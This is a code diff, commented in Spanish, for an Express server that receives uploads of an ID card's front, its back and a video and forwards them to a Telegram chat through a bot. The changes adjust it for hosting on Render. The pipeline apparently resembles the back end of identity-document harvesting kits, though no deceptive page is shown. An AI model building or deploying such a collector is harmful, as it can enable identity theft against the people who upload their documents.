@@ -3,15 +3,16 @@ const multer = require('multer');
 const axios = require('axios');
 const FormData = require('form-data');
 const path = require('path');
-require('dotenv').config(); // Asegúrate de tener dotenv instalado: npm install dotenv
 
 // --- Configuración de Seguridad ---
+// Render tomará estas variables de tu panel de "Environment"
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 if (!BOT_TOKEN || !CHAT_ID) {
-    console.error("Error: Las variables TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID deben estar definidas.");
-    process.exit(1);
+    console.error("Error: Las variables TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID deben estar definidas en el entorno del servidor.");
+    // No salimos del proceso para que los logs de Render muestren el error
+    // process.exit(1); 
 }
 
 // --- URLs de la API de Telegram ---
@@ -24,21 +25,19 @@ const port = process.env.PORT || 3000;
 
 // Configuración de Multer para recibir 3 archivos EN MEMORIA
 const storage = multer.memoryStorage();
-// ¡ACTUALIZADO! Usamos .fields() para esperar 3 archivos con nombres específicos
 const upload = multer({ 
     storage: storage,
     limits: { fileSize: 50 * 1024 * 1024 } // Límite de 50MB por archivo
 });
 
 // --- Servir los archivos del Frontend ---
-// ¡IMPORTANTE! Tus archivos (index.html, style.css, script.js)
-// deben estar en una carpeta llamada 'public'
+// Sirve todo lo que esté dentro de la carpeta 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 
 // --- El Endpoint de Subida (Actualizado) ---
 app.post(
     '/api/enviar-a-telegram', 
-    // Usamos .fields() para los 3 archivos
+    // Espera 3 campos de archivo específicos
     upload.fields([
         { name: 'idFront', maxCount: 1 },
         { name: 'idBack', maxCount: 1 },
@@ -52,6 +51,12 @@ app.post(
         if (!req.files || !req.files.idFront || !req.files.idBack || !req.files.video) {
             console.error("Error: No se recibieron los 3 archivos esperados.");
             return res.status(400).send({ error: 'Faltan archivos (se esperan 3).' });
+        }
+        
+        // Validar que las variables de entorno estén cargadas
+        if (!BOT_TOKEN || !CHAT_ID) {
+             console.error("Error 500: Las variables de Telegram no están configuradas en el servidor.");
+             return res.status(500).send({ error: 'Error de configuración interna del servidor.' });
         }
 
         try {
@@ -107,7 +112,12 @@ app.post(
     }
 );
 
+// Ruta principal para servir el index.html (opcional pero recomendado)
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 // Iniciar el servidor
 app.listen(port, () => {
-    console.log(`Servidor escuchando en http://localhost:${port}`);
+    console.log(`Servidor escuchando en el puerto ${port}`);
 });
